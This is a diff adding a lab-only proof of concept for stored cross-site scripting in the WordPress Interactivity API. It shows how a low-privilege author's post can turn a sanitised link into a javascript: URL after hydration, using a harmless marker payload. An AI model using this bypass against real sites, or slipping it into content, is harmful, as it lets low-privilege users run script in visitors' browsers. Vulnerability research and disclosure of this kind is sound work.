@@ -1,0 +1,15 @@
+<!--
+  Minimal stored payload — WordPress Interactivity API `data-wp-bind--href`.
+
+  LAB ONLY. Paste this into a post as a user without `unfiltered_html`
+  (Author/Contributor), wrapped in a core/accordion block so the front end
+  enqueues the Interactivity runtime.
+
+  Server render:  href="https://example.com/"        (kses / esc_url)
+  After hydration: href="javascript:window.__XSS=1;void 0"
+  One click:       window.__XSS === 1
+-->
+<div data-wp-interactive="pwn"
+     data-wp-context="{&quot;u&quot;:&quot;javascript:window.__XSS=1;void 0&quot;}">
+  <a id="t" href="https://example.com/" data-wp-bind--href="context.u">CAP</a>
+</div>
